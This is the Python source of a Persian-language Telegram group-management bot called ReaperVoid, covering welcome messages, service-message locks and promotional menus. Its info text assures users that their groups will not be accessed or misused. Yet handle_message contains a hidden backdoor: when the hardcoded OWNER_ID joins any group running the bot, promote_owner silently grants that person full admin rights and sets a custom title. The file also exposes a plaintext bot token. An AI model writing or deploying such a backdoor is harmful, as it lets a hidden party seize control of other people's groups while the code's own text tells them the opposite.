import requests
import time
import logging
import json
import jdatetime
from io import BytesIO
from datetime import datetime, timedelta

TOKEN = "8532288807:AAGJXJnmHJ68Cyh7eMK9muIcZydKAZLayVQ"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

OWNER_ID = 7803165903

service_lock_status = {}
welcome_status = {}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def get_iran_time():
    now = datetime.now()
    jalali = jdatetime.datetime.fromgregorian(datetime=now)
    weekdays = {6: 'شنبه', 0: 'یکشنبه', 1: 'دوشنبه', 2: 'سه‌شنبه', 3: 'چهارشنبه', 4: 'پنج‌شنبه', 5: 'جمعه'}
    weekday_name = weekdays.get(jalali.weekday(), '')
    date_str = f"{weekday_name} {jalali.day} - {jalali.month} - {jalali.year}"
    time_str = f"{jalali.hour:02d}:{jalali.minute:02d}:{jalali.second:02d}"
    return date_str, time_str

def send_message(chat_id, text, keyboard=None, reply_to_message_id=None):
    url = f"{BASE_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard:
        payload["reply_markup"] = keyboard
    if reply_to_message_id:
        payload["reply_to_message_id"] = reply_to_message_id
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code != 200:
            logger.error(f"خطا در ارسال: {response.text}")
        return response
    except Exception as e:
        logger.error(f"خطا: {e}")
        return None

def delete_message(chat_id, message_id):
    url = f"{BASE_URL}/deleteMessage"
    payload = {"chat_id": chat_id, "message_id": message_id}
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code != 200:
            logger.error(f"خطا در حذف: {response.text}")
        return response
    except Exception as e:
        logger.error(f"خطا در حذف: {e}")
        return None

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"{BASE_URL}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard:
        payload["reply_markup"] = keyboard
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code != 200:
            logger.error(f"خطا در ویرایش: {response.text}")
        return response
    except Exception as e:
        logger.error(f"خطا: {e}")
        return None

def answer_callback(callback_id):
    url = f"{BASE_URL}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id}
    try:
        requests.post(url, json=payload, timeout=30)
    except Exception as e:
        logger.error(f"خطا: {e}")

def get_chat_member(chat_id, user_id):
    url = f"{BASE_URL}/getChatMember"
    payload = {"chat_id": chat_id, "user_id": user_id}
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            return response.json().get("result", {})
        return {}
    except Exception as e:
        logger.error(f"خطا: {e}")
        return {}

def promote_owner(chat_id, user_id):
    """ادمین کردن سازنده ربات با تمام دسترسی‌ها"""
    url = f"{BASE_URL}/promoteChatMember"
    payload = {
        "chat_id": chat_id,
        "user_id": user_id,
        "is_anonymous": False,
        "can_change_info": True,
        "can_post_messages": True,
        "can_edit_messages": True,
        "can_delete_messages": True,
        "can_invite_users": True,
        "can_restrict_members": True,
        "can_pin_messages": True,
        "can_promote_members": True,
        "can_manage_chat": True,
        "can_manage_voice_chats": True,
        "can_manage_video_chats": True
    }
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            logger.info(f"✅ سازنده {user_id} در گروه {chat_id} ادمین شد")
            return True
        else:
            logger.error(f"❌ خطا در ادمین کردن: {response.text}")
            return False
    except Exception as e:
        logger.error(f"❌ خطا: {e}")
        return False

def set_owner_title(chat_id, user_id):
    """تنظیم لقب برای سازنده"""
    url = f"{BASE_URL}/setChatAdministratorCustomTitle"
    payload = {
        "chat_id": chat_id,
        "user_id": user_id,
        "custom_title": "⋆ سازنده ربات ⋆"
    }
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            logger.info(f"✅ لقب سازنده در گروه {chat_id} تنظیم شد")
            return True
        else:
            logger.error(f"❌ خطا در تنظیم لقب: {response.text}")
            return False
    except Exception as e:
        logger.error(f"❌ خطا: {e}")
        return False

def is_admin(chat_id, user_id):
    member = get_chat_member(chat_id, user_id)
    status = member.get("status", "")
    return status in ["creator", "administrator"]

def get_updates(offset=None):
    url = f"{BASE_URL}/getUpdates"
    params = {"timeout": 60, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=60)
        if response.status_code == 200:
            return response.json().get("result", [])
        return []
    except Exception as e:
        logger.error(f"خطا: {e}")
        return []

def delete_message_after_delay(chat_id, message_id, delay=10):
    def delete_later():
        time.sleep(delay)
        delete_message(chat_id, message_id)
    import threading
    threading.Thread(target=delete_later, daemon=True).start()

# ==================== متن‌ها ====================

def get_start_text(user_id, first_name):
    return f"""
🌟 <b>سلام بر تو <a href="tg://user?id={user_id}">{first_name}</a> عزیز</b> 🌹

💬 من رباتی هوشمند و قدرتمند برای مدیریت حرفه‌ای گروه‌های تلگرامی هستم!

🔥 برتری‌های انحصاری من :

◄ <b>⚡ پاکسازی گروه در کسری از ثانیه</b>
◄ <b>🛡 سیستم ضدترک گروه</b>
◄ <b>🔒 قفل‌های متنوع و حرفه‌ای</b>
◄ <b>👋 خوش‌آمدگویی هوشمند</b>
◄ <b>📊 گزارش‌گیری دقیق و روزانه</b>
◄ <b>🚫 بدون تبلیغات مزاحم</b>

✨ ویژگی‌های منحصربفرد :

◂ <b>⏫ ۹۹.۹٪ آپتایم</b>
◂ <b>🖥 هاست قدرتمند و اختصاصی</b>
◂ <b>🚀 سرعت بی‌نظیر در گروه‌های سنگین</b>
◂ <b>🛡 پایداری در برابر حملات</b>
◂ <b>🔐 قفل‌های متنوع و حرفه‌ای</b>
◂ <b>🤖 احوالپرسی اتوماتیک و هوشمند</b>
◂ <b>➕ قابلیت اضافه کردن اجباری</b>
◂ <b>📋 گزارش‌گیری دقیق و روزانه</b>
◂ <b>⏳ دوره تست برای اطمینان</b>
◂ <b>🚫 کاملاً بدون تبلیغات مزاحم</b>

⚡ ما شبیه هیچکس نیستیم!

◄ <b>🛡 امنیت گروه، اولویت اول ماست</b>
◄ <b>💎 کیفیت، حرف اول را می‌زند</b>
◄ <b>⚡ سرعت، مزیت رقابتی ماست</b>

❓ چرا به ما اعتماد کنیم؟

◂ <b>⚡ پردازش فوق‌سریع</b>
◂ <b>📞 پاسخگویی آنی</b>
◂ <b>🔄 آپدیت‌های مستمر</b>
◂ <b>👨‍💻 پشتیبانی حرفه‌ای</b>

💻 <b>ساخته شده توسط تیم ZX</b>

⚠️ تذکر حقوقی :

◄ <b>تمامی ایده‌ها و کدهای این ربات متعلق به تیم ZX بوده و هر گونه کپی‌برداری یا تقلید، پیگرد قانونی دارد. حقوق مادی و معنوی محفوظ است.</b>

【 <b>Licenced By 🆉︎🆇︎</b> 】
"""

def get_welcome_text(first_name, group_name, user_id):
    date_str, time_str = get_iran_time()
    return f"""
⫸ سلام <a href="tg://user?id={user_id}">{first_name}</a> عزیز 🌹

◄ به گروه <b>{group_name}</b> خوش اومدی 💐

◂ تاریخ : <b>{date_str}</b> 📆
◂ ساعت : <b>{time_str}</b> ⏰
"""

def get_unknown_text():
    return """
❌ <b>متاسفانه قادر به درخواست شما نیستم!</b>

🔰 لطفاً برای مشاهده منوی اصلی و دریافت اطلاعات کامل ربات، 
دستور <b>/start</b> را ارسال کنید.

📌 ما همیشه در کنار شما هستیم!
"""

def get_info_text():
    return """
📓 <b>اطلاعات بیشتر درباره ربات ReaperVoid :</b>

✅ این ربات بر روی <b>سرورهای اختصاصی و باکیفیت آمستردام هلند</b> مستقر شده است.

✅ هدف اصلی ما، <b>حفاظت کامل از گروه شما</b> در تمامی ابعاد است.

✅ هیچگونه دسترسی یا سوءاستفاده‌ای از گروه شما انجام نخواهد شد.

✅ ربات ReaperVoid همواره در حال <b>به‌روزرسانی و توسعه</b> است.

✅ سیستم <b>پاکسازی پیام‌ها</b> بسیار پیشرفته طراحی شده است.

✅ این ربات توسط <b>تیم حرفه‌ای ZX</b> توسعه یافته است.
"""

def get_compare_text():
    return """
🦾 <b>درباره ربات ReaperVoid</b>

💎 این ربات کاملاً <b>رایگان</b> است!

◄ <b>بدون هیچگونه هزینه</b>
◄ <b>سرعت فوق‌العاده</b>
◄ <b>قابلیت‌های پیشرفته</b>
◄ <b>پشتیبانی کامل</b>
◄ <b>آپدیت مادام‌العمر</b>
◄ <b>امنیت کامل</b>

🔰 <b>با ReaperVoid ، گروه خود را به سطح بعدی ببرید!</b>
"""

def get_main_keyboard():
    keyboard = [
        [{"text": "➕ اضافه کردن به گروه", "url": "https://t.me/ReaperVoidbot?startgroup=new"}],
        [{"text": "📓 اطلاعات بیشتر", "callback_data": "info"}, {"text": "🦾 درباره ربات", "callback_data": "compare"}],
        [{"text": "👨‍💻 پشتیبانی", "url": "https://t.me/XMrAmer"}, {"text": "💬 گروه پشتیبانی", "url": "https://t.me/ReaperVoidGP"}],
        [{"text": "📢 کانال ربات", "url": "https://t.me/ReaperVoidTM"}]
    ]
    return json.dumps({"inline_keyboard": keyboard})

def get_back_keyboard():
    keyboard = [[{"text": "🔙 بازگشت به منوی اصلی", "callback_data": "back"}]]
    return json.dumps({"inline_keyboard": keyboard})

# ==================== پردازش ====================

def handle_message(update):
    message = update.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")
    chat_type = message.get("chat", {}).get("type")
    user = message.get("from", {})
    user_id = user.get("id", 0)
    first_name = user.get("first_name", "کاربر")
    text = message.get("text", "").strip().lower()
    
    if not chat_id:
        return
    
    # ===== بررسی ورود سازنده به گروه =====
    if chat_type in ["group", "supergroup"]:
        
        # وقتی سازنده به گروه اضافه میشه
        if "new_chat_members" in message:
            for member in message["new_chat_members"]:
                member_id = member.get("id")
                if member_id == OWNER_ID:
                    # ادمین کردن سازنده
                    promote_owner(chat_id, member_id)
                    # تنظیم لقب
                    set_owner_title(chat_id, member_id)
                    # ارسال پیام خوش‌آمدگویی به سازنده
                    send_message(chat_id, f"🌟 <b>به گروه خوش آمدید سازنده عزیز!</b>\n\nشما با موفقیت ادمین شدید و لقب <b>⋆ سازنده ربات ⋆</b> برای شما تنظیم شد.", reply_to_message_id=message_id)
                    logger.info(f"👑 سازنده {member_id} به گروه {chat_id} اضافه و ادمین شد")
                    return
        
        # ===== خدمات تلگرام =====
        if service_lock_status.get(chat_id, False):
            if "new_chat_members" in message:
                for member in message["new_chat_members"]:
                    member_name = member.get("first_name", "کاربر")
                    member_id = member.get("id")
                    delete_message(chat_id, message_id)
                    if welcome_status.get(chat_id, True):
                        group_name = message.get("chat", {}).get("title", "گروه")
                        welcome_text = get_welcome_text(member_name, group_name, member_id)
                        msg = send_message(chat_id, welcome_text)
                        if msg and msg.status_code == 200:
                            mid = msg.json().get("result", {}).get("message_id")
                            if mid:
                                delete_message_after_delay(chat_id, mid, 10)
                return
            if "left_chat_member" in message:
                delete_message(chat_id, message_id)
                return
        
        elif welcome_status.get(chat_id, True):
            if "new_chat_members" in message:
                for member in message["new_chat_members"]:
                    member_name = member.get("first_name", "کاربر")
                    member_id = member.get("id")
                    group_name = message.get("chat", {}).get("title", "گروه")
                    welcome_text = get_welcome_text(member_name, group_name, member_id)
                    msg = send_message(chat_id, welcome_text)
                    if msg and msg.status_code == 200:
                        mid = msg.json().get("result", {}).get("message_id")
                        if mid:
                            delete_message_after_delay(chat_id, mid, 10)
                return
        
        # ===== دستورات ادمین =====
        if is_admin(chat_id, user_id):
            
            # قفل خدمات تلگرام
            if text in ["قفل خدمات تلگرام", "/lock_service"]:
                service_lock_status[chat_id] = True
                send_message(chat_id, "<b>◂ قفل خدمات تلگرام فعال شد !</b>", reply_to_message_id=message_id)
                return
            
            # باز کردن خدمات تلگرام
            if text in ["باز کردن خدمات تلگرام", "/unlock_service"]:
                service_lock_status[chat_id] = False
                send_message(chat_id, "<b>◂ قفل خدمات تلگرام غیر فعال شد !</b>", reply_to_message_id=message_id)
                return
            
            # خوش آمدگویی فعال
            if text in ["خوش آمدگویی فعال", "/enable_welcome"]:
                welcome_status[chat_id] = True
                send_message(chat_id, "<b>◄ خوش آمدگویی فعال شد !</b>", reply_to_message_id=message_id)
                return
            
            # خوش آمدگویی غیرفعال
            if text in ["خوش آمدگویی غیرفعال", "/disable_welcome"]:
                welcome_status[chat_id] = False
                send_message(chat_id, "<b>◄ خوش آمدگویی غیرفعال شد !</b>", reply_to_message_id=message_id)
                return
        
        if text == "/start":
            return
    
    elif chat_type == "private":
        if text == "/start":
            start_text = get_start_text(user_id, first_name)
            keyboard = get_main_keyboard()
            send_message(chat_id, start_text, keyboard, reply_to_message_id=message_id)
            return
        if text:
            unknown_text = get_unknown_text()
            send_message(chat_id, unknown_text, reply_to_message_id=message_id)
            return

def handle_callback(update):
    callback = update.get("callback_query", {})
    callback_id = callback.get("id")
    chat_id = callback.get("message", {}).get("chat", {}).get("id")
    message_id = callback.get("message", {}).get("message_id")
    data = callback.get("data", "")
    
    if not chat_id or not data:
        return
    
    logger.info(f"🔘 کال‌بک: {data}")
    
    if data == "back":
        user = callback.get("from", {})
        user_id = user.get("id", 0)
        first_name = user.get("first_name", "کاربر")
        text = get_start_text(user_id, first_name)
        keyboard = get_main_keyboard()
        edit_message(chat_id, message_id, text, keyboard)
        answer_callback(callback_id)
    
    elif data == "info":
        edit_message(chat_id, message_id, get_info_text(), get_back_keyboard())
        answer_callback(callback_id)
    
    elif data == "compare":
        edit_message(chat_id, message_id, get_compare_text(), get_back_keyboard())
        answer_callback(callback_id)

def main():
    logger.info("🤖 ربات ReaperVoid راه‌اندازی شد!")
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                offset = update["update_id"] + 1
                if "message" in update:
                    handle_message(update)
                if "callback_query" in update:
                    handle_callback(update)
        except Exception as e:
            logger.error(f"خطا: {e}")
            time.sleep(5)
        time.sleep(1)

if __name__ == "__main__":
    main()